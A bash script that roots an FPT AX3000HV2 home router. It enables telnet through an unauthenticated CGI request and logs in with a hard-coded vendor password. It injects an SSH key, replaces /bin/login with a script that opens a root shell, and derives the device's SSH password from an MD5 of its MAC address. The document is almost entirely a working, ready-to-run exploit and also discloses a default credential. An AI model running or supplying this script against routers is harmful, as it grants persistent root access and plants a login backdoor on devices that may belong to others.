#!/bin/bash

# Configuration
MODEM_IP="192.168.1.1"
TELNET_USER="admin"
TELNET_PASS="hbmt@_fpt"
# Replace with your actual public key
PUB_KEY="ssh-ed25519 AAAAC3Nza..." 

echo "--------------------------------------------------------"
echo "    FPT AX3000HV2 Auto root SSH Script 	              "
echo "--------------------------------------------------------"

# Trigger Telnet via CGI
echo "[*] Enabling Telnet via CGI..."
curl -s --max-time 5 "http://$MODEM_IP/cgi-bin/telnetenable.cgi?telnetenable=1" > /dev/null

if [ $? -ne 0 ]; then
    echo "[-] Failed to trigger CGI. Check connection to $MODEM_IP"
fi

# Automated Telnet Interaction using Expect
echo "[*] Accessing Telnet to extract MAC and inject keys..."

# We use a temporary file to capture the output of the telnet session
TMP_OUTPUT=$(mktemp)

expect <<EOF > "$TMP_OUTPUT"
spawn telnet $MODEM_IP
expect "login:"
send "$TELNET_USER\r"
expect "Password:"
send "$TELNET_PASS\r"
expect "#"

# Extract MAC
send "ifconfig eth0\r"
expect "#"

# SSH Key injection & Dropbear setup
send "mkdir -p /etc/dropbear\r"
expect "#"
send "echo '$PUB_KEY' > /etc/dropbear/authorized_keys\r"
expect "#"
send "rm /bin/login\r"
expect "#"
send "printf '#!/bin/sh\nexec /bin/sh -l\n' > /bin/login\r"
expect "#"
send "chmod +x /bin/login\r"
expect "#"
send "/etc/init.d/dropbear enable\r"
expect "#"
send "/etc/init.d/dropbear restart\r"
expect "#"

send "exit\r"
expect eof
EOF

# Extract MAC and Calculate Password
# Look for a MAC address pattern in the captured output
MAC=$(grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$TMP_OUTPUT" | head -n 1 | tr '[:lower:]' '[:upper:]')

if [ -n "$MAC" ]; then
    echo -e "\033[0;32m[+] Extracted MAC: $MAC\033[0m"

    # MD5 Hash calculation
    MD5_HEX=$(echo -n "$MAC" | md5sum | cut -d' ' -f1)
    
    # Extract middle 16 characters (starting at index 8, length 16)
    HEX_MID=$(echo "${MD5_HEX:8:16}" | tr '[:upper:]' '[:lower:]')
    
    # Password Munging Logic
    # Convert hex chars at index 0, 1, and 2 to decimals to use as replacement indices
    P0=$((16#${HEX_MID:0:1}))
    P1=$((16#${HEX_MID:1:1}))
    P2=$((16#${HEX_MID:2:1}))

    # Reconstruct the string with replacements using sed
    # We use a helper array or string manipulation
    FINAL_PASS=$HEX_MID
    
    # Applying replacements (Position P0 -> *, P1 -> _, P2 -> @)
    # Using a bash array for easy character replacement
    chars=( $(echo "$FINAL_PASS" | grep -o .) )
    chars[$P0]="*"
    chars[$P1]="_"
    chars[$P2]="@"
    
    FINAL_PASS=$(printf "%s" "${chars[@]}")

    echo -e "\033[0;33m[!] Predicted SSH Password: $FINAL_PASS\033[0m"
else
    echo -e "\033[0;31m[-] Could not retrieve MAC address from output.\033[0m"
fi

# Cleanup
rm "$TMP_OUTPUT"
echo -e "\033[0;32m[*] Finished script\033[0m"